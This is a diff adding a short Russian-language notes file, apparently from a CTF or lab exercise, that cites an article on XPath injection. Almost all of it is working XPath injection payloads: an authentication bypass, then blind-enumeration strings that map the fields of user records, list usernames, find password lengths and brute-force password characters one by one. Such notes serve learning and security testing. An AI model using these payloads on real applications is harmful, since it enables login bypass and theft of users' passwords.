@@ -1,0 +1,22 @@
+https://raz0r.name/articles/vvedenie-v-xpath-inekcii/
+
+Инъекция (обход авторизации): ' or '1'='1
+В каждом юзере по 6 полей: '] | //*[count(*)='6'] | /foo[bar='
+Первое поле – Username: '] | //*[name(*[1])='Username'] | /foo[bar='
+Четвёртое поле – Email: '] | //*[name(*[4])='Email'] | /foo[bar='
+Пятое поле – Role: '] | //*[name(*[5])='Role'] | /foo[bar='
+Следовательно, пароль в шестом: '] | //*[name(*[6])='Password'] | /foo[bar='
+
+Первый – rita:  '] | //*[1] | /foo[bar='
+Длина пароля 11: '] | //*[1][string-length(Password)=11] | /foo[bar='
+
+Второй – jim: '] | //*[2] | /foo[bar='
+'] | //*[2][string-length(Password)=16] | /foo[bar='
+
+Третий – bryan: '] | //*[3] | /foo[bar='
+'] | //*[3][string-length(Password)=23] | /foo[bar='
+
+Четвёртый – sarah: '] | //*[4] | /foo[bar='
+'] | //*[4][string-length(Password)=10] | /foo[bar='
+
+Перебор: '] | //*[3][substring(Password,1,1)='a'] | /foo[bar='
